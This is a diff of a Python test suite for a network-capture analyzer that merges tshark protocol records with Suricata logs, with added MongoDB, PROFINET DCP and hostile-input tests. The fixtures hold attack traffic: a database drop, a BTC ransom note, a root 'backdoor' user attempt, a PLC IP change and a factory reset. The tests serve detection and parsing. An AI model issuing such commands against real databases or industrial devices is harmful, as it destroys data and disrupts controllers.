+        self.assertEqual(self.sessions[40000], {'service': 'rsh', 'result': 'refused', 'probe': 'GET / HTTP/1.0',
+                                                'error': 'Can not make pipe'})
+
+    def test_a_probe_with_nuls_is_no_login(self):
+        """A scanner's RPC packet holds NULs where rsh's strings would end."""
+        from shark_protocols import RShell, Packet
+        from types import SimpleNamespace
+        rsh = RShell()
+        flow = SimpleNamespace(key=1)
+        probe = bytes.fromhex('80000028729f000000000000000200018690000000040000000000000000')
+        rsh.feed(Packet(1, 1.0, flow, 40001, 514, 'rsh'), {'@rsh': [probe.hex()]})
+        [(_, _, _, body)] = rsh.finish()
+        self.assertNotIn('user', body)
+        self.assertEqual(body['probe'][:5], '...(r')
+
+    def test_the_merge_adds_the_records(self):
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'rsh_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'rsh.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual(counts.get('rsh'), 3, "not the probe's: Suricata identified that flow as HTTP")
+        self.assertFalse({'conn_rsh', 'conn_rlogin', 'conn_exec'} & set(counts), 'records, not connection cards')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestMongoDB(unittest.TestCase):
+    """tests/protocol_fixtures.write_mongodb_pcap, read by the structured
+    pass: each connection, and the changes with their results - with what
+    Suricata 8.0.8 logged for the capture (tests/data/mongodb_fixture.eve.json):
+    flows it gives no protocol, since it doesn't parse MongoDB."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_mongodb_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'mongodb.pcap')
+        write_mongodb_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.connections = {r['src_port']: r['mongodb'] for r in cls.records if r['event_type'] == 'mongodb'}
+        cls.actions = [r['mongodb_action'] for r in cls.records if r['event_type'] == 'mongodb_action']
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_an_open_server(self):
+        c = self.connections[50000]
+        self.assertEqual({k: c.get(k) for k in ('driver', 'os', 'server_version', 'databases_listed', 'databases',
+                                                'answered', 'unauthenticated', 'errors')},
+                         {'driver': 'PyMongo 4.6.3', 'os': 'Linux 6.1.0', 'server_version': '6.0.5',
+                          'databases_listed': ['admin', 'shop'], 'databases': ['admin', 'shop', 'READ_ME_TO_RECOVER_YOUR_DATA'],
+                          'answered': True, 'unauthenticated': True, 'errors': 0})
+        self.assertEqual(c['commands'], {'isMaster': 1, 'buildInfo': 1, 'listDatabases': 1, 'dropDatabase': 1, 'insert': 1})
+
+    def test_a_refused_login_names_the_user_but_keeps_no_secret(self):
+        c = self.connections[50001]
+        self.assertEqual({k: c.get(k) for k in ('auth_mechanism', 'user', 'auth_database', 'login', 'errors')},
+                         {'auth_mechanism': 'SCRAM-SHA-256', 'user': 'alice', 'auth_database': 'admin',
+                          'login': 'failed', 'errors': 2})
+        self.assertNotIn('unauthenticated', c, 'nothing past the handshake was answered')
+        self.assertNotIn('hunter2', json.dumps(self.records), "createUser's pwd")
+        self.assertNotIn('proof', json.dumps(self.records), "the login's proof")
+
+    def test_changes_with_their_results(self):
+        self.assertEqual(self.actions, [
+            {'command': 'dropDatabase', 'database': 'shop', 'result': 'ok'},
+            {'command': 'insert', 'database': 'READ_ME_TO_RECOVER_YOUR_DATA', 'collection': 'README', 'count': 1,
+             'document': 'content: All your data is backed up. Send 0.01 BTC to 1AbcFixture to recover it., '
+                         'email: recover@example.net', 'result': 'ok', 'n': 1},
+            {'command': 'createUser', 'database': 'admin', 'user': 'backdoor', 'roles': ['role: root, db: admin'],
+             'result': 'error: command createUser requires authentication'},
+        ])
+
+    def test_a_sasl_user(self):
+        from shark_protocols import _mongo_sasl_user
+        self.assertEqual(_mongo_sasl_user('SCRAM-SHA-1', b'n,,n=a=2Cb,r=xyz'.hex()), 'a,b')
+        self.assertEqual(_mongo_sasl_user('PLAIN', b'\x00bob\x00secret'.hex()), 'bob', 'never the password')
+
+    def test_the_flows_match_suricatas_and_the_merge_adds_the_records(self):
+        from scripts.compare_shark_suricata import compare
+        report = compare(_load_eve('mongodb_fixture.eve.json'), self.records)['flow']
+        self.assertEqual((report['matched'], report['named_by_tshark'], report['differences']), (2, 2, []))
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'mongodb_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'mongodb.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('mongodb'), counts.get('mongodb_action')), (2, 3))
+        self.assertNotIn('conn_mongo', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+class TestPNDCP(unittest.TestCase):
+    """tests/protocol_fixtures.write_pn_dcp_pcap: PROFINET DCP's actions and
+    the devices that described themselves - with what Suricata 8.0.8 logged
+    for the capture (tests/data/pn_dcp_fixture.eve.json) - only 'Ethertype
+    unknown' decoder alerts, since it doesn't decode PROFINET."""
+
+    @classmethod
+    def setUpClass(cls):
+        from tests.protocol_fixtures import write_pn_dcp_pcap
+        cls.tmpdir = tempfile.mkdtemp()
+        cls.pcap = os.path.join(cls.tmpdir, 'pn_dcp.pcap')
+        write_pn_dcp_pcap(cls.pcap)
+        cls.records = shark_analyzer.run_tshark(cls.pcap)
+        cls.actions = [r for r in cls.records if r['event_type'] == 'pn_dcp']
+        cls.devices = [r['pn_device'] for r in cls.records if r['event_type'] == 'pn_device']
+
+    @classmethod
+    def tearDownClass(cls):
+        shutil.rmtree(cls.tmpdir, ignore_errors=True)
+
+    def test_identify_queries_fold_their_repeats(self):
+        from tests.protocol_fixtures import PN_ENGINEERING, PN_CONTROLLER
+        queries = {r['src_ip']: r['pn_dcp'] for r in self.actions if r['pn_dcp']['service'] == 'Identify'}
+        self.assertEqual(queries, {
+            PN_ENGINEERING: {'service': 'Identify', 'query': 'all', 'count': 1, 'responses': 1},
+            PN_CONTROLLER: {'service': 'Identify', 'query': 'plc-line2', 'count': 2, 'responses': 0}})
+
+    def test_sets_with_their_results(self):
+        from tests.protocol_fixtures import PN_ENGINEERING, PN_DEVICE
+        sets = [r for r in self.actions if r['pn_dcp']['service'] == 'Set']
+        self.assertEqual([r['pn_dcp'] for r in sets], [
+            {'service': 'Set', 'changes': ['IP address'], 'ip': '10.9.9.9', 'subnet_mask': '255.255.255.0',
+             'gateway': '10.9.9.1', 'permanent': True, 'result': 'ok'},
+            {'service': 'Set', 'changes': ['reset to factory'], 'result': 'not possible (in operation)'}])
+        self.assertEqual({(r['src_ip'], r['dest_ip']) for r in sets}, {(PN_ENGINEERING, PN_DEVICE)},
+                         'from the station that sent them, though the device spoke first on that conversation')
+
+    def test_the_device(self):
+        from tests.protocol_fixtures import PN_DEVICE
+        self.assertEqual(self.devices, [{
+            'mac': PN_DEVICE, 'count': 1, 'last_seen': self.devices[0]['last_seen'], 'station_name': 'plc-line1',
+            'device_type': 'S7-1500', 'vendor_id': '0x002a', 'device_id': '0x010e', 'ip': '192.168.0.20',
+            'subnet_mask': '255.255.255.0', 'gateway': '192.168.0.1', 'role': 'IO controller'}])
+
+    def test_the_merge_adds_the_records(self):
+        d = os.path.join(self.tmpdir, 'analysis')
+        os.makedirs(d)
+        shutil.copy(self.pcap, d)
+        events_db = os.path.join(d, 'events.db')
+        db.create_sqlite_db(events_db, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data',
+                                                    'pn_dcp_fixture.eve.json'))
+        self.assertTrue(shark_analyzer.build(d, os.path.join(d, 'pn_dcp.pcap')))
+        shark_analyzer.merge(d)
+        counts = db.get_event_types_sqlite(events_db)
+        self.assertEqual((counts.get('pn_dcp'), counts.get('pn_device')), (4, 1))
+        self.assertNotIn('conn_pn_dcp', counts, 'records, not a connection card')
+
+
+@unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
 class TestGOOSE(unittest.TestCase):
     """tests/protocol_fixtures.write_goose_pcap: one record per state
     change, repeats counted, with what Suricata 8.0.7 logged for the
@@ -2045,19 +3348,19 @@ class TestAnswered(unittest.TestCase):
         self.assertEqual(flows['10.9.0.2']['flow']['pkts_toclient'], 1, 'the ICMP error still counts as a packet back')
 
     def test_the_merge_gives_the_protocols_nobody_answered_one_card(self):
-        """Echo was answered once, so it keeps its card; memcached's probes
+        """Echo was answered once, so it keeps its card; chargen's probes
         got only an ICMP error, so they're filed under Probed Only - with
         their own app_proto."""
         from tests.pcap_fixtures import write_pcap
         from tests.protocol_fixtures import _icmp_unreachable, _udp_packet
         echo = b'hello'
-        memcache = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
-        probe = _udp_packet('10.9.0.1', '10.9.0.2', 40005, 11211, memcache)
+        chargen = b'x'
+        probe = _udp_packet('10.9.0.1', '10.9.0.2', 40005, 19, chargen)
         packets = [_udp_packet('10.9.0.1', '10.9.0.3', 40002, 7, echo),
                    _udp_packet('10.9.0.3', '10.9.0.1', 7, 40002, echo),
                    _udp_packet('10.9.0.1', '10.9.0.4', 40003, 7, echo),
                    probe, _icmp_unreachable('10.9.0.2', '10.9.0.1', probe),
-                   _udp_packet('10.9.0.1', '10.9.0.5', 40006, 11211, memcache)]
+                   _udp_packet('10.9.0.1', '10.9.0.5', 40006, 19, chargen)]
         d = tempfile.mkdtemp()
         self.addCleanup(shutil.rmtree, d, ignore_errors=True)
         pcap = os.path.join(d, 'probes.pcap')
@@ -2067,14 +3370,14 @@ class TestAnswered(unittest.TestCase):
         events_db = os.path.join(d, 'events.db')
         db.create_sqlite_db(events_db, eve)
         self.assertTrue(shark_analyzer.build(d, pcap))
-        self.assertEqual(shark_analyzer.probe_only_protocols(shark_analyzer.shark_db_path(d)), {'memcache'})
+        self.assertEqual(shark_analyzer.probe_only_protocols(shark_analyzer.shark_db_path(d)), {'chargen'})
         shark_analyzer.merge(d)
         counts = db.get_event_types_sqlite(events_db)
         self.assertEqual((counts.get('conn_echo'), counts.get(db.PROBED_CONNECTION_TYPE)), (2, 2))
-        self.assertNotIn('conn_memcache', counts)
+        self.assertNotIn('conn_chargen', counts)
         probed = db.query_events_sqlite(events_db, db.PROBED_CONNECTION_TYPE)
         self.assertEqual(sorted((e['app_proto'], e['shark']['answered']) for e in probed),
-                         [('memcache', 'ICMP error only'), ('memcache', 'no')])
+                         [('chargen', 'ICMP error only'), ('chargen', 'no')])
 
 
 class TestFlowOrientation(unittest.TestCase):
@@ -2124,7 +3427,9 @@ class TestFlowOrientation(unittest.TestCase):
                  ({'ftp__request__command': 'USER'}, False), ({'s7comm__header__rosctr': '3'}, True),
                  ({'s7comm__header__rosctr': '1'}, False), ({'s7comm__header__rosctr': '7'}, None),
                  ({'tls__handshake__type': '2'}, True), ({'tls__handshake__type': '1\x1f16'}, False),   # the first of a packet's handshakes
-                 ({'tls__handshake__type': '11'}, None), ({'ip__src': '10.0.0.1'}, None), ({}, None)]
+                 ({'tls__handshake__type': '11'}, None), ({'pn_dcp__service_type': '0'}, False),
+                 ({'pn_dcp__service_type': '1'}, True), ({'pn_dcp__service_type': '5'}, True),   # 'not supported'
+                 ({'ip__src': '10.0.0.1'}, None), ({}, None)]
         for values, expected in cases:
             with self.subTest(values=values):
                 self.assertIs(shark_analyzer._is_reply(cols(**values)), expected)
@@ -2208,6 +3513,19 @@ class TestAnalyze(unittest.TestCase):
         conn.close()
         self.assertEqual(shark_analyzer.status(self.dir, self.pcap), {'status': 'not_started'})
         self.assertFalse(os.path.exists(db_path), 'the stale database is removed so it gets rebuilt')
+
+    def test_a_newer_format_is_kept_and_merged(self):
+        """REGRESSION: a server left running while the code was updated -
+        its build child loading the new code - took each shark.db it built
+        for an old one: removed it, queued it again, and every other
+        capture waited behind it, for good ('tshark is waiting for another
+        capture to finish')."""
+        shark_analyzer.analyze(self.dir, self.pcap)
+        db_path = shark_analyzer.shark_db_path(self.dir)
+        with mock.patch.object(shark_analyzer, 'SHARK_FORMAT_VERSION', shark_analyzer.SHARK_FORMAT_VERSION - 1):
+            self.assertEqual(shark_analyzer.status(self.dir, self.pcap)['status'], 'ready')
+            self.assertTrue(os.path.exists(db_path), 'kept')
+            self.assertTrue(shark_analyzer.is_current(db_path))
 
     def test_a_failed_run_records_why_and_leaves_no_database(self):
         with open(self.pcap, 'wb') as f:
@@ -2579,6 +3897,100 @@ class TestHostileInput(unittest.TestCase):
         self.assertEqual(len(llmnr.unanswered_keys), 99)
 
 
+class TestHostileProtocolInput(unittest.TestCase):
+    """A parser that raises loses the analysis every tshark record, and one
+    that loops stalls it to its timeout: bytes a sender chose mustn't do
+    either. Found in the 5.3.0 review."""
+
+    def test_a_negative_memcached_size_doesnt_loop(self):
+        from shark_protocols import Memcache, _MemcacheExchange
+        for line, from_client in ((b'set k 0 0 -17\r\n', True), (b'VALUE k 0 -9\r\n', False)):
+            exchange = _MemcacheExchange(None, 0)
+            Memcache()._chunk(exchange, line, from_client)
+            self.assertEqual(exchange.skip, [0, 0])
+
+    def test_nested_resp_attributes_are_refused_not_recursed(self):
+        from shark_protocols import _resp_value
+        with self.assertRaises(ValueError):
+            _resp_value(b'|0\r\n' * 2000 + b'+OK\r\n', 0)
+
+    def test_a_truncated_tds_rpc(self):
+        from shark_protocols import _tds_rpc
+        self.assertEqual(_tds_rpc(b'\xff\xff\x0a\x00\x00\x00\x00\x00\xe7'), ('sp_executesql', None))
+        self.assertEqual(_tds_rpc(b'\xff\xff\x0a\x00\x00\x00\x00\x00\xe7\x10\x00' + bytes(8)), ('sp_executesql', None))
+
+    def test_zabbix_json_of_the_wrong_types(self):
+        from shark_protocols import Packet, Zabbix
+        flow = shark_analyzer._Flow(('k',), 'TCP', 4, '10.0.0.5', '10.0.0.9', 50000, 10051, 1.0, '0')
+        packet = Packet(1, 1.0, flow, 50000, 10051, 'zabbix', '10.0.0.5', '10.0.0.9')
+        empty = {f: [] for f in Zabbix.fields}
+        for request, response in (({'request': 'active checks', 'host': ['x']},
+                                   {'response': 'success', 'data': [{'key': 'k', 'itemid': [1]}], 'commands': 5}),
+                                  ({'request': 'agent data', 'host': 'h', 'data': 5, 'commands': 7}, {'response': 'success'}),
+                                  ({'request': 'passive checks', 'data': 3}, {'data': 4})):
+            zabbix = Zabbix()
+            zabbix.feed(packet, dict(empty, **{'zabbix.request': ['True'], 'zabbix.data': [json.dumps(request)]}))
+            zabbix.feed(packet, dict(empty, **{'zabbix.response': ['True'], 'zabbix.data': [json.dumps(response)]}))
+            self.assertEqual(len(zabbix.finish()), 1)
+
+    def test_digits_int_cant_read(self):
+        """'\u00b2' is a digit to str.isdigit(), not to int()."""
+        from shark_protocols import IRC, Packet
+        flow = shark_analyzer._Flow(('k',), 'TCP', 4, '10.0.0.5', '10.0.0.9', 50000, 6667, 1.0, '0')
+        lines = ':srv \u00b2 x\r\n:a!b@c PRIVMSG x :\x01DCC SEND f \u00b2 5 6\x01\r\n'
+        irc = IRC()
+        irc.feed(Packet(1, 1.0, flow, 6667, 50000, 'irc', '10.0.0.9', '10.0.0.5'), {'@irc': [lines.encode().hex()]})
+        self.assertEqual(irc.connections[flow.key].body['dcc'][0]['address'], '\u00b2:5')
+
+    @unittest.skipUnless(HAS_TSHARK, 'tshark not installed')
+    def test_a_parser_that_raises_skips_its_packet_not_the_run(self):
+        """For a user, a parser's exception costs the packet it was reading,
+        counted for the server's log - not every record of the run. The
+        tests run strict, so a parser's bug fails them."""
+        from shark_protocols import Redis
+        from tests.protocol_fixtures import write_redis_pcap
+        with tempfile.TemporaryDirectory() as tmp:
+            pcap = os.path.join(tmp, 'redis.pcap')
+            write_redis_pcap(pcap)
+            calls = []
+
+            def flaky(self, pkt, v, feed=Redis.feed):
+                calls.append(pkt.frame)
+                if len(calls) == 3:
+                    raise ValueError('a bug')
+                return feed(self, pkt, v)
+            with mock.patch.object(Redis, 'feed', flaky), mock.patch.object(shark_analyzer, '_STRICT_PARSERS', False):
+                records = shark_analyzer.run_tshark(pcap)
+                self.assertEqual(shark_analyzer._PARSER_ERRORS, {'Redis': [1, 'ValueError: a bug']})
+            # (the third packet was the inline connection's only command:
+            # that connection has no record, the other three do)
+            self.assertEqual(sum(r['event_type'] == 'redis' for r in records), 3)
+            self.assertEqual(sum(r['event_type'] == 'flow' for r in records), 4, 'every flow still there')
+            calls.clear()
+            with mock.patch.object(Redis, 'feed', flaky), mock.patch.object(shark_analyzer, '_STRICT_PARSERS', True):
+                with self.assertRaises(ValueError):
+                    shark_analyzer.run_tshark(pcap)
+
+    def test_json_fields_tshark_wrote_twice(self):
+        """tshark's JSON makes a field that appears twice a list: an ID that
+        is one keys nothing, and text that is one reads as empty."""
+        from shark_protocols import _id, _text
+        self.assertEqual([_id(v) for v in ('7', 7, ['7', '8'], {'a': 1}, True, None)], ['7', 7, None, None, None, None])
+        self.assertEqual([_text(v) for v in ('db.coll', ['a', 'b'], 5, None)], ['db.coll', '', '', ''])
+
+    def test_passwords_a_statement_or_command_gives_are_masked(self):
+        from shark_protocols import _TACACS_SECRET, _sql_password
+        for statement, shown, password in (
+                ("EXEC sp_addlogin 'eve', 'Secr3t!'", "EXEC sp_addlogin 'eve', ***", 'Secr3t!'),
+                ("EXEC sp_password 'Old1','N3w!','sa'", "EXEC sp_password ***,***,'sa'", 'Old1'),
+                ("EXEC sp_password NULL,'N3w!','sa'", "EXEC sp_password NULL,***,'sa'", 'N3w!'),
+                ("ALTER LOGIN sa WITH PASSWORD='n' OLD_PASSWORD='o'", 'ALTER LOGIN sa WITH PASSWORD=*** OLD_PASSWORD=***', 'n'),
+                ('ALTER USER x IDENTIFIED BY newpw REPLACE oldpw', 'ALTER USER x IDENTIFIED BY *** REPLACE ***', 'newpw')):
+            self.assertEqual(_sql_password(statement), (shown, password))
+        self.assertEqual(_TACACS_SECRET.sub(r'\1***', 'username admin password 0 Cisco123'), 'username admin password 0 ***')
+        self.assertEqual(_TACACS_SECRET.sub(r'\1***', 'show running-config'), 'show running-config')
+
+
 class TestMergeRows(unittest.TestCase):
     """Which of a shark.db's rows join Suricata's in events.db."""
     SURICATA = {'1:http': [(1767225600.0, 1767225620.0)]}     # a flow Suricata called HTTP, 00:00:00-00:00:20
@@ -2590,6 +4002,14 @@ class TestMergeRows(unittest.TestCase):
         self.assertEqual(self._kept([_row('s7comm'), _row('nbns'), _row('llmnr'), _row('ssdp'),
                                      _row('dns'), _row('http'), _row('smb'), _row('ftp_data'), _row('mdns')]),
                          [('s7comm', None), ('nbns', None), ('llmnr', None), ('ssdp', None)])
+
+    def test_a_protocol_suricata_misreads_keeps_its_records(self):
+        """IRC that opens with PASS is FTP to Suricata: its label doesn't
+        keep IRC's records out - only another protocol's."""
+        identified = {'1:irc': [(1767225600.0, 1767225620.0, 'ftp')], '1:http': [(1767225600.0, 1767225620.0, 'http')]}
+        rows = [_row('irc', cid='1:irc'), _row('irc', cid='1:http'), _row('telnet', cid='1:irc')]
+        self.assertEqual([(e['event_type'], e['community_id']) for e in shark_analyzer.merge_rows(rows, identified)],
+                         [('irc', '1:irc')])
 
     def test_tls_failures_stay_on_flows_suricata_identified_with_its_certificate(self):
         """Suricata logs no TLS alerts, so its word on the flow doesn't
@@ -2610,19 +4030,20 @@ class TestMergeRows(unittest.TestCase):
         self.assertEqual(len(list(shark_analyzer.merge_rows(rows, self.SURICATA))), 2)
 
     def test_flows_become_connection_rows_only_for_protocols_with_nothing_else(self):
-        self.assertEqual(self._kept([_row('flow', app='openvpn'), _row('flow', app='wol'),
+        self.assertEqual(self._kept([_row('flow', app='quake'), _row('flow', app='wol'),
                                      _row('flow', app='telnet'), _row('flow', app='http'), _row('flow', app='arp'),
                                      _row('flow', app='s7comm'), _row('flow', app='syslog'), _row('flow', app='')]),
-                         [('conn_openvpn', 'openvpn'), ('conn_wol', 'wol')],
+                         [('conn_quake', 'quake'), ('conn_wol', 'wol')],
                          "telnet, http and arp are Suricata's; s7comm and syslog have records; '' is no protocol")
 
     def test_nothing_on_a_flow_suricata_gave_a_protocol(self):
-        """The 4SICS case: a scanner's HTTP request to the rsh port is HTTP
-        to Suricata and rsh to tshark - Suricata's word stands."""
-        self.assertEqual(self._kept([_row('flow', cid='1:http', app='rsh'), _row('nbns', cid='1:http'),
-                                     _row('flow', cid='1:http', app='rsh', when='2026-01-01T01:00:00.000000+0000'),
-                                     _row('flow', cid='1:other', app='rsh')]),
-                         [('conn_rsh', 'rsh'), ('conn_rsh', 'rsh')],
+        """The 4SICS case: a scanner's HTTP request to a port tshark names
+        by its number (rsh's there; chargen's here, which has no records) is
+        HTTP to Suricata - Suricata's word stands."""
+        self.assertEqual(self._kept([_row('flow', cid='1:http', app='chargen'), _row('nbns', cid='1:http'),
+                                     _row('flow', cid='1:http', app='chargen', when='2026-01-01T01:00:00.000000+0000'),
+                                     _row('flow', cid='1:other', app='chargen')]),
+                         [('conn_chargen', 'chargen'), ('conn_chargen', 'chargen')],
                          'the same Community ID an hour later is another connection; another ID is too')
 
 
@@ -3004,11 +4425,11 @@ class TestSharkAPI(unittest.TestCase):
         self.assertIn(body['status'], ('queued', 'running', 'ready'))
         body = self._wait_ready()
         self.assertIsInstance(body.pop('seconds'), int)
-        self.assertEqual(sorted(body.pop('types')), ['conn_irc', 'llmnr', 'nbns', 'ssdp'],
-                         'what tshark added: the chatter records and the IRC connection row, which the page reloads its cards for')
+        self.assertEqual(sorted(body.pop('types')), ['irc', 'llmnr', 'nbns', 'ssdp'],
+                         "what tshark added: the chatter's and IRC's records, which the page reloads its cards for")
         self.assertEqual(body, {'status': 'ready', 'merged': True})
         _, stats = self._get(f'/api/stats?md5={self.md5}')
-        self.assertEqual(sorted(stats['tshark_types']), ['conn_irc', 'llmnr', 'nbns', 'ssdp'],
+        self.assertEqual(sorted(stats['tshark_types']), ['irc', 'llmnr', 'nbns', 'ssdp'],
                          'the protocols here Suricata lacks - the stats say which')
 
     def test_waits_for_suricata(self):
